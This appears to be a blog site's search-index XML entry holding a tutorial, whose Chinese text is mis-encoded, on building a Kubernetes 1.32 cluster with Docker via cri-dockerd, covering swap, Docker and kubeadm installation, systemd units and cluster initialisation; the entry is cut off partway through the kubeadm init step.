<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>åˆ›å»º Kubernetes 1.32+ é›†ç¾¤å¹¶ä½¿ç”¨ Docker ä½œä¸ºå®¹å™¨è¿è¡Œæ—¶</title>
    <link href="/2025/11/05/%E5%88%9B%E5%BB%BA-Kubernetes-1-32-%E9%9B%86%E7%BE%A4%E5%B9%B6%E4%BD%BF%E7%94%A8-Docker-%E4%BD%9C%E4%B8%BA%E5%AE%B9%E5%99%A8%E8%BF%90%E8%A1%8C%E6%97%B6/"/>
    <url>/2025/11/05/%E5%88%9B%E5%BB%BA-Kubernetes-1-32-%E9%9B%86%E7%BE%A4%E5%B9%B6%E4%BD%BF%E7%94%A8-Docker-%E4%BD%9C%E4%B8%BA%E5%AE%B9%E5%99%A8%E8%BF%90%E8%A1%8C%E6%97%B6/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h2><p>æœ¬æ–‡ä»‹ç»äº†ä½¿ç”¨ kubeadm æ­å»ºåŸºäº Docker è¿è¡Œæ—¶ çš„ Kubernetes é›†ç¾¤ï¼Œé‡ç‚¹æ¼”ç¤ºäº†åœ¨ dockershim è¢«ç§»é™¤åï¼Œå¦‚ä½•é€šè¿‡ cri-dockerd é‡æ–°é›†æˆ Dockerã€‚å†…å®¹æ¶µç›–ç¯å¢ƒå‡†å¤‡ã€ç»„ä»¶å®‰è£…ã€é›†ç¾¤åˆå§‹åŒ–åŠ Flannel ç½‘ç»œéƒ¨ç½²ï¼Œå¸®åŠ©è¯»è€…å¿«é€ŸæŒæ¡ Docker åœ¨æ–°ç‰ˆ Kubernetes ä¸­çš„é€‚é…æ–¹æ³•ã€‚</p><h2 id="0x01-ç¯å¢ƒ"><a href="#0x01-ç¯å¢ƒ" class="headerlink" title="0x01 ç¯å¢ƒ"></a>0x01 ç¯å¢ƒ</h2><p><img src="/image/image_bwK44c-vlh.png" alt="å›¾ 1ï¼šå®éªŒç¯å¢ƒ" title="å›¾ 1ï¼šå®éªŒç¯å¢ƒ"></p><table><thead><tr><th>æ“ä½œç³»ç»Ÿ</th><th>IP åœ°å€</th><th>è§’è‰²</th></tr></thead><tbody><tr><td>Ubuntu 22.04</td><td>172.16.9.138</td><td>æ§åˆ¶å¹³é¢</td></tr><tr><td>Kali 2025.3</td><td>172.16.9.139</td><td>å·¥ä½œèŠ‚ç‚¹</td></tr></tbody></table><h2 id="0x02-å…ˆå†³æ¡ä»¶"><a href="#0x02-å…ˆå†³æ¡ä»¶" class="headerlink" title="0x02 å…ˆå†³æ¡ä»¶"></a>0x02 å…ˆå†³æ¡ä»¶</h2><p>è¯¥å‘½ä»¤å°†æ˜¾ç¤ºç³»ç»Ÿå†…å­˜ä½¿ç”¨æƒ…å†µï¼ŒåŒ…æ‹¬äº¤æ¢ç©ºé—´çš„ä¿¡æ¯ã€‚å¦‚æœç³»ç»Ÿå¯ç”¨äº†äº¤æ¢ç©ºé—´ï¼Œè¾“å‡ºä¸­å°†æ˜¾ç¤ºäº¤æ¢è¡Œï¼Œå…¶ä¸­åŒ…æ‹¬æ€»äº¤æ¢ç©ºé—´ã€å·²ç”¨äº¤æ¢ç©ºé—´å’Œå¯ç”¨äº¤æ¢ç©ºé—´ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">free -h<br></code></pre></td></tr></table></figure><h3 id="2-1-ç¦ç”¨äº¤æ¢ç©ºé—´"><a href="#2-1-ç¦ç”¨äº¤æ¢ç©ºé—´" class="headerlink" title="2.1 ç¦ç”¨äº¤æ¢ç©ºé—´"></a>2.1 ç¦ç”¨äº¤æ¢ç©ºé—´</h3><p>Kubernetes ä¸æ”¯æŒå¯ç”¨ swapï¼ˆäº¤æ¢ç©ºé—´ï¼‰ï¼Œä½ æœ‰ä¸¤ç§è§£å†³æ–¹æ³•ã€‚æ¨èçš„åšæ³•æ˜¯ç¦ç”¨ swapï¼Œå› ä¸ºè¿™ç¬¦åˆ Kubernetes çš„æœ€ä½³å®è·µã€‚å¦‚æœä½ å¸Œæœ›ç»§ç»­ä½¿ç”¨ swapï¼Œå¯ä»¥é€šè¿‡ä¿®æ”¹ Kubelet çš„å¯åŠ¨å‚æ•°æ¥é¿å…è¿™ä¸ªé”™è¯¯ã€‚</p><h4 id="2-1-1-ç¦ç”¨-swap"><a href="#2-1-1-ç¦ç”¨-swap" class="headerlink" title="2.1.1: ç¦ç”¨ swap"></a>2.1.1: ç¦ç”¨ swap</h4><p>æœ€å¸¸è§çš„è§£å†³æ–¹æ³•æ˜¯ç¦ç”¨ç³»ç»Ÿçš„ swapã€‚ä½ å¯ä»¥æŒ‰ç…§ä»¥ä¸‹æ­¥éª¤è¿›è¡Œæ“ä½œï¼š</p><ol><li><p><strong>ä¸´æ—¶ç¦ç”¨ swap</strong>ï¼ˆç›´åˆ°ç³»ç»Ÿé‡å¯ï¼‰</p><p>è¿è¡Œä»¥ä¸‹å‘½ä»¤æ¥ä¸´æ—¶ç¦ç”¨ swapï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> swapoff -a<br></code></pre></td></tr></table></figure><p>è¯¥å‘½ä»¤å°†ç¦ç”¨æ‰€æœ‰äº¤æ¢ç©ºé—´ï¼Œç›´è‡³ä¸‹æ¬¡ç³»ç»Ÿé‡å¯ã€‚</p></li><li><p><strong>æ°¸ä¹…ç¦ç”¨ swap</strong>ï¼ˆç³»ç»Ÿé‡å¯åä»ç„¶ç¦ç”¨ï¼‰</p><p>è‹¥è¦æ°¸ä¹…ç¦ç”¨ swapï¼Œéœ€è¦ä¿®æ”¹ <code>/etc/fstab</code> æ–‡ä»¶ï¼Œåˆ é™¤æˆ–æ³¨é‡Šæ‰æ¶‰åŠ swap çš„è¡Œï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> nano /etc/fstab<br></code></pre></td></tr></table></figure><p>æ‰¾åˆ°å¦‚ä¸‹æ‰€ç¤ºçš„è¡Œï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/swapfile none swap sw 0 0<br></code></pre></td></tr></table></figure><p>åˆ é™¤è¯¥è¡Œæˆ–åœ¨è¡Œå‰åŠ  <code>#</code> ä»¥æ³¨é‡Šæ‰ï¼Œç„¶åä¿å­˜æ–‡ä»¶å¹¶é€€å‡ºç¼–è¾‘å™¨ã€‚</p></li></ol><h4 id="2-1-2-è®¾ç½®-fail-swap-on-false-é€‰é¡¹"><a href="#2-1-2-è®¾ç½®-fail-swap-on-false-é€‰é¡¹" class="headerlink" title="2.1.2 è®¾ç½® --fail-swap-on=false é€‰é¡¹"></a>2.1.2 è®¾ç½® <code>--fail-swap-on=false</code> é€‰é¡¹</h4><p>å¦‚æœä½ ä¸å¸Œæœ›ç¦ç”¨ swapï¼Œå¯ä»¥é€‰æ‹©å°† <code>--fail-swap-on</code> å‚æ•°è®¾ç½®ä¸º <code>false</code>ï¼Œè¿™æ ·å³ä½¿ swap è¢«å¯ç”¨ï¼ŒKubelet ä¹Ÿä¸ä¼šå› æ­¤å¤±è´¥ã€‚</p><ol><li><p>æ‰¾åˆ° Kubelet çš„å¯åŠ¨é…ç½®æ–‡ä»¶ï¼Œé€šå¸¸æ˜¯ <code>/etc/systemd/system/kubelet.service.d/10-kubeadm.conf</code> æˆ– <code>/etc/kubernetes/kubelet.conf</code>ã€‚æ–‡ä»¶è·¯å¾„å¯èƒ½å› å®‰è£…æ–¹æ³•è€Œå¼‚ã€‚</p></li><li><p>ç¼–è¾‘è¯¥æ–‡ä»¶ï¼Œæ·»åŠ  <code>--fail-swap-on=false</code> é€‰é¡¹ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> nano /etc/systemd/system/kubelet.service.d/10-kubeadm.conf<br></code></pre></td></tr></table></figure><p>åœ¨ <code>ExecStart</code> è¡Œä¸­åŠ å…¥ <code>--fail-swap-on=false</code>ï¼Œä¾‹å¦‚ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ExecStart=/usr/bin/kubelet --fail-swap-on=<span class="hljs-literal">false</span> ...<br></code></pre></td></tr></table></figure></li><li><p>ä¿å­˜å¹¶é€€å‡ºç¼–è¾‘å™¨ï¼Œç„¶åé‡æ–°åŠ è½½ systemd é…ç½®å¹¶é‡å¯ Kubeletï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> systemctl daemon-reload<br><span class="hljs-built_in">sudo</span> systemctl restart kubelet<br></code></pre></td></tr></table></figure></li></ol><h2 id="0x03-å®‰è£…-Docker-Engine"><a href="#0x03-å®‰è£…-Docker-Engine" class="headerlink" title="0x03 å®‰è£… Docker Engine"></a>0x03 å®‰è£… Docker Engine</h2><p>ä¸ºäº†ä¾¿äº Docker Engine çš„å®‰è£…ä¸ç®¡ç†ï¼Œå»ºè®®é€šè¿‡ <code>apt</code> æ–¹å¼è¿›è¡Œå®‰è£…ã€‚</p><ol><li><p>åœ¨æ–°çš„è™šæ‹Ÿæœºä¸Šé¦–æ¬¡å®‰è£… Docker Engine ä¹‹å‰ï¼Œéœ€è¦æ·»åŠ  Docker ä»“åº“ï¼Œä»¥ä¾¿å®‰è£…å’Œæ›´æ–° Docker Engineã€‚å¦‚æœæ‚¨ä½¿ç”¨çš„æ˜¯ Ubuntu è¡ç”Ÿå‘è¡Œç‰ˆï¼ˆå¦‚ Linux Mintï¼‰ï¼Œåˆ™å¯èƒ½éœ€è¦ä½¿ç”¨ <code>UBUNTU_CODENAME</code> è€Œä¸æ˜¯ <code>VERSION_CODENAME</code>ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># æ·»åŠ  Docker çš„ å®˜æ–¹ GPG å¯†é’¥ï¼š</span><br><span class="hljs-built_in">sudo</span> apt-get update<br><span class="hljs-built_in">sudo</span> apt-get install ca-certificates curl<br><span class="hljs-built_in">sudo</span> install -m 0755 -d /etc/apt/keyrings<br><span class="hljs-built_in">sudo</span> curl -fsSL https://download.docker.com/linux/ubuntu/gpg -o /etc/apt/keyrings/docker.asc<br><span class="hljs-built_in">sudo</span> <span class="hljs-built_in">chmod</span> a+r /etc/apt/keyrings/docker.asc<br><br><span class="hljs-comment"># å°†ä»“åº“æ·»åŠ åˆ° apt æºä¸­</span><br><span class="hljs-built_in">echo</span> \<br>  <span class="hljs-string">&quot;deb [arch=<span class="hljs-subst">$(dpkg --print-architecture)</span> signed-by=/etc/apt/keyrings/docker.asc] https://download.docker.com/linux/ubuntu \</span><br><span class="hljs-string">  <span class="hljs-subst">$(. /etc/os-release &amp;&amp; echo <span class="hljs-string">&quot;<span class="hljs-variable">$VERSION_CODENAME</span>&quot;</span>)</span> stable&quot;</span> | \<br>  <span class="hljs-built_in">sudo</span> <span class="hljs-built_in">tee</span> /etc/apt/sources.list.d/docker.list &gt; /dev/null<br><span class="hljs-built_in">sudo</span> apt-get update<br></code></pre></td></tr></table></figure><p>ç”±äº Kali Linux æ˜¯ Debian çš„è¡ç”Ÿå‘è¡Œç‰ˆï¼Œåœ¨å®‰è£…å·¥ä½œèŠ‚ç‚¹æ—¶ï¼Œéœ€è¦ç”¨ç›¸åº”çš„ Debian ç‰ˆæœ¬ä»£å·æ¥æ›¿æ¢å‘½ä»¤ä¸­ç”¨äºæ‰“å°ç‰ˆæœ¬ä»£å·çš„éƒ¨åˆ†ã€‚ä¾‹å¦‚ï¼Œå°† <code>(. /etc/os-release &amp;&amp; echo &quot;$VERSION_CODENAME&quot;)</code>æ›¿æ¢ä¸º <code>trixie</code>ã€‚</p></li></ol><p><img src="/image/image_eORBiVrGty.png" alt="å›¾ 2ï¼šç»™ Kali Linux æ·»åŠ  Docker Engine çš„ apt ä»“åº“æº" title="å›¾2ï¼šç»™ Kali Linux æ·»åŠ  Docker Engine çš„ apt ä»“åº“æº"><br>2. å®‰è£…æœ€æ–°ç‰ˆæœ¬çš„ Docker è½¯ä»¶åŒ…ã€‚</p>   <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> apt-get install docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin<br><br></code></pre></td></tr></table></figure><ol start="3"><li><p>é€šè¿‡è¿è¡Œ hello-world é•œåƒæ¥éªŒè¯ Docker Engine æ˜¯å¦å®‰è£…æˆåŠŸã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> docker run hello-world<br></code></pre></td></tr></table></figure></li></ol><h2 id="0x04-å®‰è£…-kubeadm"><a href="#0x04-å®‰è£…-kubeadm" class="headerlink" title="0x04 å®‰è£… kubeadm"></a>0x04 å®‰è£… kubeadm</h2><p>ä¸ºäº†ä¾¿äº kubeadm çš„å®‰è£…å’Œç®¡ç†ï¼Œæˆ‘ä»¬å°†ä½¿ç”¨ kubeadm è¿›è¡Œæ“ä½œã€‚</p><ol><li><p>æ›´æ–° apt è½¯ä»¶åŒ…ç´¢å¼•å¹¶å®‰è£… Kubernetes apt ä»“åº“æ‰€éœ€çš„è½¯ä»¶åŒ…ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> apt-get update<br><span class="hljs-built_in">sudo</span> apt-get install -y apt-transport-https ca-certificates curl gpg<br></code></pre></td></tr></table></figure></li><li><p>ä¸‹è½½ Kubernetes è½¯ä»¶åŒ…ä»“åº“çš„å…¬å…±ç­¾åå¯†é’¥ã€‚æ‰€æœ‰ä»“åº“éƒ½ä½¿ç”¨ç›¸åŒçš„ç­¾åå¯†é’¥ï¼Œå› æ­¤å¯ä»¥å¿½ç•¥ URL ä¸­çš„ç‰ˆæœ¬å·ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># å¦‚æœç›®å½• /etc/apt/keyrings ä¸å­˜åœ¨ï¼Œéœ€è¦å…ˆåˆ›å»º</span><br><span class="hljs-comment"># sudo mkdir -p -m 755 /etc/apt/keyrings</span><br><br>curl -fsSL https://pkgs.k8s.io/core:/stable:/v1.32/deb/Release.key | <span class="hljs-built_in">sudo</span> gpg --dearmor -o /etc/apt/keyrings/kubernetes-apt-keyring.gpg<br></code></pre></td></tr></table></figure></li><li><p>æ·»åŠ é€‚å½“çš„ Kubernetes apt ä»“åº“ã€‚è¯·æ³¨æ„ï¼Œæ­¤ä»“åº“ä»…åŒ…å«é€‚ç”¨äº Kubernetes 1.32 çš„è½¯ä»¶åŒ…ï¼›å¯¹äºå…¶ä»–æ¬¡è¦ç‰ˆæœ¬ï¼Œè¯·æ›´æ”¹ URL ä¸­çš„ç‰ˆæœ¬å·ï¼Œå¹¶å‚è€ƒç›¸åº”ç‰ˆæœ¬çš„å®˜æ–¹å®‰è£…æŒ‡å—ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;deb [signed-by=/etc/apt/keyrings/kubernetes-apt-keyring.gpg] https://pkgs.k8s.io/core:/stable:/v1.32/deb/ /&#x27;</span> | <span class="hljs-built_in">sudo</span> <span class="hljs-built_in">tee</span> /etc/apt/sources.list.d/kubernetes.list<br></code></pre></td></tr></table></figure></li><li><p>æ›´æ–° apt è½¯ä»¶åŒ…ç´¢å¼•ï¼Œå®‰è£… kubeletã€kubeadm å’Œ kubectlï¼Œå¹¶é”å®šå®ƒä»¬çš„ç‰ˆæœ¬ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> apt-get update<br><span class="hljs-built_in">sudo</span> apt-get install -y kubelet kubeadm kubectl<br><span class="hljs-built_in">sudo</span> apt-mark hold kubelet kubeadm kubectl<br></code></pre></td></tr></table></figure></li><li><p>ï¼ˆå¯é€‰ï¼‰åœ¨è¿è¡Œ kubeadm ä¹‹å‰å¯ç”¨ kubelet æœåŠ¡ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> systemctl <span class="hljs-built_in">enable</span> --now kubelet<br></code></pre></td></tr></table></figure></li></ol><h2 id="0x05-å®‰è£…-Dockershim"><a href="#0x05-å®‰è£…-Dockershim" class="headerlink" title="0x05 å®‰è£… Dockershim"></a>0x05 å®‰è£… Dockershim</h2><p>éšç€æ—¶é—´çš„æ¨ç§»ï¼ŒKubernetes åˆ›å»ºäº† CRI æ¥å£ï¼Œå…è®¸ç”¨æˆ·æ¥å…¥ä¸åŒçš„è¿è¡Œæ—¶ç¯å¢ƒï¼Œä»è€Œä½¿ Kubernetes é€æ¸æ¼”å˜æˆä¸€ä¸ªä¸å®¹å™¨æ— å…³çš„å¹³å°ã€‚</p><p>Docker Engine æ˜¯ä¸€ä¸ªæ¯” Kubernetes æ›´æ—©çš„é¡¹ç›®ï¼Œå¹¶æœªå®ç° CRIã€‚ä¸ºäº†å¼¥åˆæ–°æ—§æŠ€æœ¯ä¹‹é—´çš„å·®è·ï¼ŒKubernetes å¼•å…¥äº†ä¸€ä¸ªåä¸º dockershim çš„ç»„ä»¶ï¼Œä½¿ Kubernetes èƒ½å¤Ÿä½¿ç”¨ Docker ä½œä¸ºè¿è¡Œæ—¶æ¥æ‰§è¡Œå®¹å™¨ã€‚ç„¶è€Œï¼Œä» Kubernetes 1.24 ç‰ˆæœ¬å¼€å§‹ï¼Œdockershim ç»„ä»¶è¢«å®Œå…¨ç§»é™¤ï¼Œå› æ­¤ Kubernetes ä¸å†åŸç”Ÿæ”¯æŒ Docker ä½œä¸ºè¿è¡Œæ—¶ã€‚</p><p><img src="/image/image_yC5tnvVo7S.png" alt="å›¾ 3ï¼šæ—©æœŸçš„ Kubernetes é€šè¿‡ dockershim ä½¿ç”¨ dockerï¼Œå¦‚ä»Šå·²å®Œå…¨ç§»é™¤ dockershim äº†" title="å›¾ 3ï¼šæ—©æœŸçš„Kubernetesé€šè¿‡ dockershim ä½¿ç”¨ dockerï¼Œå¦‚ä»Šå·²å®Œå…¨ç§»é™¤dockershimäº†"></p><blockquote><p>ğŸš¦ è‹¥è¦äº†è§£æ›´å¤šå…³äºå®¹å™¨è¿è¡Œæ—¶çš„çŸ¥è¯†ï¼Œè¯·æŸ¥çœ‹æˆ‘ä»¬çš„æ–‡ç« <a href="../../../../public/2024/07/09/%E5%B0%8F%E7%8C%AB%E5%92%AA%E5%B8%A6%E4%BD%A0%E7%90%86%E6%B8%85Docker%E3%80%81containerd%E3%80%81CRI-O-%E5%92%8C-runc-%E4%B9%8B%E9%97%B4%E7%9A%84%E5%8C%BA%E5%88%AB/index.html" title="å°çŒ«å’ªå¸¦ä½ ç†æ¸…Dockerã€containerdã€CRI-O å’Œ runc ä¹‹é—´çš„åŒºåˆ«">å°çŒ«å’ªå¸¦ä½ ç†æ¸… Dockerã€containerdã€CRI-O å’Œ runc ä¹‹é—´çš„åŒºåˆ«</a></p></blockquote><p>ç›®å‰ï¼ŒMirantis ä»åœ¨ç»´æŠ¤ Dockershimï¼Œæˆ‘ä»¬åªéœ€å‰å¾€å…¶ GitHub ä»“åº“ä¸‹è½½ <a href="https://github.com/Mirantis/cri-dockerd/releases" title="cri-dockerd">cri-dockerd</a> å³å¯ã€‚</p><p><img src="/image/image_dV6RKBg_1k.png" alt="å›¾ 4ï¼šcir-dockerd çš„ GitHub ä»“åº“" title="å›¾ 4ï¼šcir-dockerd çš„GitHub ä»“åº“"></p><ol><li><p>ç”±äºæˆ‘çš„ç”µè„‘æ˜¯ MAC M1ï¼Œå› æ­¤æˆ‘ä¸‹è½½äº† ARM64 æ¶æ„çš„ cri-dockerdã€‚æ‚¨éœ€è¦æ ¹æ®å®é™…æƒ…å†µæ›´æ”¹ URL ä¸­çš„æ¶æ„ä¿¡æ¯ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">wget https://github.com/Mirantis/cri-dockerd/releases/download/v0.3.15/cri-dockerd-0.3.15.arm64.tgz<br>tar -xvf cri-dockerd-0.3.15.arm64.tgz<br><span class="hljs-built_in">cd</span> cri-dockerd/<br><span class="hljs-built_in">mkdir</span> -p /usr/local/bin<br>install -o root -g root -m 0755 ./cri-dockerd /usr/local/bin/cri-dockerd<br></code></pre></td></tr></table></figure></li><li><p>æ·»åŠ  cri-docker.socket å’Œ cri-docker.service æ–‡ä»¶ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> <span class="hljs-built_in">tee</span> /etc/systemd/system/cri-docker.service &lt;&lt; <span class="hljs-string">EOF</span><br><span class="hljs-string">[Unit]</span><br><span class="hljs-string">Description=CRI Interface for Docker Application Container Engine</span><br><span class="hljs-string">Documentation=https://docs.mirantis.com</span><br><span class="hljs-string">After=network-online.target firewalld.service docker.service</span><br><span class="hljs-string">Wants=network-online.target</span><br><span class="hljs-string">Requires=cri-docker.socket</span><br><span class="hljs-string">[Service]</span><br><span class="hljs-string">Type=notify</span><br><span class="hljs-string">ExecStart=/usr/local/bin/cri-dockerd --container-runtime-endpoint fd:// --network-plugin=</span><br><span class="hljs-string">ExecReload=/bin/kill -s HUP $MAINPID</span><br><span class="hljs-string">TimeoutSec=0</span><br><span class="hljs-string">RestartSec=2</span><br><span class="hljs-string">Restart=always</span><br><span class="hljs-string">StartLimitBurst=3</span><br><span class="hljs-string">StartLimitInterval=60s</span><br><span class="hljs-string">LimitNOFILE=infinity</span><br><span class="hljs-string">LimitNPROC=infinity</span><br><span class="hljs-string">LimitCORE=infinity</span><br><span class="hljs-string">TasksMax=infinity</span><br><span class="hljs-string">Delegate=yes</span><br><span class="hljs-string">KillMode=process</span><br><span class="hljs-string">[Install]</span><br><span class="hljs-string">WantedBy=multi-user.target</span><br><span class="hljs-string">EOF</span><br><br><span class="hljs-built_in">sudo</span> <span class="hljs-built_in">tee</span> /etc/systemd/system/cri-docker.socket &lt;&lt; <span class="hljs-string">EOF</span><br><span class="hljs-string">[Unit]</span><br><span class="hljs-string">Description=CRI Docker Socket for the API</span><br><span class="hljs-string">PartOf=cri-docker.service</span><br><span class="hljs-string">[Socket]</span><br><span class="hljs-string">ListenStream=%t/cri-dockerd.sock</span><br><span class="hljs-string">SocketMode=0660</span><br><span class="hljs-string">SocketUser=root</span><br><span class="hljs-string">SocketGroup=docker</span><br><span class="hljs-string">[Install]</span><br><span class="hljs-string">WantedBy=sockets.target</span><br><span class="hljs-string">EOF</span><br><br></code></pre></td></tr></table></figure></li><li><p>é…ç½®å’Œç®¡ç† Kubernetes ç¯å¢ƒä¸­çš„ cri-docker æœåŠ¡ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># é‡è½½å®ˆæŠ¤è¿›ç¨‹</span><br>systemctl daemon-reload<br>systemctl <span class="hljs-built_in">enable</span> cri-docker.service<br>systemctl <span class="hljs-built_in">enable</span> --now cri-docker.socket<br><br><span class="hljs-comment"># è®¾ç½®æ‰€éœ€çš„ sysctl å‚æ•°ï¼Œè¿™äº›å‚æ•°ä¼šåœ¨é‡å¯æ—¶æŒç»­å­˜åœ¨ã€‚</span><br><span class="hljs-built_in">cat</span> &lt;&lt;<span class="hljs-string">EOF | sudo tee /etc/sysctl.d/99-kubernetes-cri.conf</span><br><span class="hljs-string">net.bridge.bridge-nf-call-iptables  = 1</span><br><span class="hljs-string">net.ipv4.ip_forward                 = 1</span><br><span class="hljs-string">net.bridge.bridge-nf-call-ip6tables = 1</span><br><span class="hljs-string">EOF</span><br><br><span class="hljs-comment"># æ— éœ€é‡å¯å³å¯åº”ç”¨ sysctl å‚æ•°</span><br><span class="hljs-built_in">sudo</span> sysctl --system<br></code></pre></td></tr></table></figure></li></ol><h2 id="0x06-åˆå§‹åŒ–é›†ç¾¤"><a href="#0x06-åˆå§‹åŒ–é›†ç¾¤" class="headerlink" title="0x06 åˆå§‹åŒ–é›†ç¾¤"></a>0x06 åˆå§‹åŒ–é›†ç¾¤</h2><ol><li><p>ç”±äºéœ€è¦æ‹‰å–çš„é•œåƒä½“ç§¯è¾ƒå¤§ä¸”æ•°é‡è¾ƒå¤šï¼Œä¸ºäº†é¿å…åœ¨åˆå§‹åŒ–é›†ç¾¤æ—¶å› ç½‘ç»œé—®é¢˜å¯¼è‡´æ— æ³•æˆåŠŸæ‹‰å–é•œåƒï¼Œæˆ‘ä»¬å¯ä»¥æå‰è¿›è¡Œé•œåƒæ‹‰å–ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> kubeadm config images pull \<br>--cri-socket unix:///var/run/cri-dockerd.sock \<br>--kubernetes-version v1.32.0<br><br></code></pre></td></tr></table></figure><p><img src="/image/image_reKz2BG0y5.png" alt="å›¾ 5ï¼šéœ€è¦æ‹‰å–çš„é•œåƒ" title="å›¾5ï¼šéœ€è¦æ‹‰å–çš„é•œåƒ"></p></li><li><p>è¿™é‡Œçš„ pod ç½‘ç»œ CIDR ä¾èµ–äºç¨åè¦å®‰è£…çš„ CNIï¼Œåœ¨æœ¬ä¾‹ä¸­ï¼Œæˆ‘ä½¿ç”¨çš„æ˜¯ Flannelã€‚<code>--apiserver-advertise-address</code>æ˜¯æ§åˆ¶å¹³é¢èŠ‚ç‚¹çš„ IP åœ°å€ï¼Œå¯ä»¥æ˜¯ç§æœ‰ IP æˆ–å…¬å…± IPã€‚å¦‚æœæ‚¨å¸Œæœ›é€šè¿‡ kubeconfig ä»é›†ç¾¤å¤–éƒ¨è®¿é—®ï¼Œåˆ™éœ€è¦æä¾›å…¬å…± IPã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> kubeadm init   \<br>--pod-network-cidr=10.244.0.0/16   \<br>--upload-certs --kubernetes-version=v1.32.0   \<br>--control-plane-endpoint=172.16.9.138   \<br>--cri-socket unix:///var/run/cri-dockerd.sock<br><br><br></code></pre></td></tr></table></figure><p>è¿™æ¡å‘½ä»¤ä¼šè¾“å‡ºä»¥ä¸‹ä¿¡æ¯ï¼Œéœ€è¦å¦¥å–„ä¿å­˜ã€‚å¦‚æœå°†æ¥æœ‰æ–°çš„èŠ‚ç‚¹åŠ å…¥é›†ç¾¤ï¼Œè¿™äº›ä¿¡æ¯å¯ä»¥ä½œä¸ºå‚è€ƒã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 